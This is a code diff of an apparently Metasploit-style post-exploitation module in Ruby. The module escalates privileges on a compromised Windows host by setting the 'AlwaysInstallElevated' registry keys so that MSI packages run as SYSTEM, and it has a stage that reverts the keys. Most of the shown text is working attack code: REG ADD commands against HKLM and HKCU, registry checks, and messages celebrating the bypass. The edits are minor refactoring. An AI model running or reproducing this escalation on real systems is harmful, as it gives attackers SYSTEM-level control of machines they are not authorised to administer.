@@ -164,6 +164,7 @@ end
 # 'Privilege escalation' - Getting @SYSTEM
 # ----------------------------------------
        def ls_getsys
+
              toor = []
              # variable API declarations
              toor = client.sys.config.getuid
@@ -198,26 +199,25 @@ end
 # 'Privilege escalation' - CHECK/SET REMOTE REGISTRY KEYS
 # -------------------------------------------------------
 def ls_stage1
+
   # list of arrays to be executed
   elevate = [
-   'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /f',
-   'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /f',
    'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f',
    'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f',
    'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True' # this key will refresh explorer.exe
   ]
 
   r=''
-  install = "AlwaysInstallElevated"
+  install_key = "AlwaysInstallElevated"
   print_status("Checking [ HKLM ] remote regedit settings...")
   hklm = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
   # check 'AlwaysInstallElevated' registry keys settings on target
-  local_machine_value = registry_getvaldata(hklm,install)
+  local_machine_value = registry_getvaldata(hklm,install_key)
 
     if local_machine_value.nil? || local_machine_value == 0
       # 'AlwaysInstallElevated' registry key non existence (build required keys then)
-      print_error("HKEY_LOCAL_MACHINE - '#{install}' does NOT exist or is SET to dword:0")
-      print_warning("Setting '#{install}' remote requiered registry keys...")
+      print_error("HKEY_LOCAL_MACHINE - '#{install_key}' does NOT exist or is SET to dword:0")
+      print_warning("Setting '#{install_key}' remote requiered registry keys...")
 
         # registry keys loop funtion
         session.response_timeout=120 
@@ -235,7 +235,7 @@ def ls_stage1
 
     else
       # 'AlwaysInstallElevated' remote registry keys are allready set to dword:1 (success!!!)
-      print_status("HKEY_LOCAL_MACHINE - '#{install}' allready set to dword:#{local_machine_value}")
+      print_status("HKEY_LOCAL_MACHINE - '#{install_key}' allready set to dword:#{local_machine_value}")
       print_warning("[REMARK]: Bypass its allready active. (no further need to change reg key data again)!")
       print_good(" Congratz, We are hable to install/run .MSI files with elevated 'SYSTEM' permissions...")
       print_line("")
@@ -256,14 +256,28 @@ end
 # REVERT 'AlwaysInstallElevated' REMOTE REGISTRY KEYS TO DEFAULT VALUES
 # ---------------------------------------------------------------------
 def ls_stage2
+
   # list of arrays to be executed
   revert = [
    'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f',
    'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f',
    'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True' # this key will refresh explorer.exe
   ]
+
+    r=''
+    install_key = "AlwaysInstallElevated"
+    print_status("Checking [ HKLM ] remote regedit settings...")
+    print_warning("Reading service hive registry keys...")
+    sleep(1.0)
+    # search in target regedit for reg key existence
+    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{install_key}")
+      print_good("Remote reg key: #{install_key} found!")
+      sleep(1.0)
+    else
+      print_error("ABORT: post-module cant find #{install_key} in regedit...")
+      return nil
+    end
  
-        r=''
         # executing list of arrays on target system and display info on screen
         print_status("Revert 'AlwaysInstallElevated' registry keys to dword:0 (default)")
         print_warning("Setting remote requiered registry keys...")
